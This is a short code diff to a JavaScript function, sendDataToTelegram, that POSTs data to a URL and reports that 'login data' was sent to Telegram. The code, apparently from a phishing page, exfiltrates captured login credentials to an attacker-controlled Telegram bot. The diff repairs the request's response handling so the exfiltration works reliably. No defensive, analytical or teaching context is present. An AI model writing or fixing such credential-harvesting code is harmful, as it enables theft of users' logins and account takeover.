@@ -20,13 +20,15 @@ function sendDataToTelegram(data) {
 
     fetch(url, {
         method: 'POST',
+        mode: 'cors',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify(params)
     })
-    .then(response => {
-        if (response.ok) {
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
             alert('Login data sent to Telegram successfully!');
         } else {
             alert('Failed to send login data to Telegram.');
@@ -35,4 +37,4 @@ function sendDataToTelegram(data) {
     .catch(error => {
         console.error('Error:', error);
     });
-           }
+}
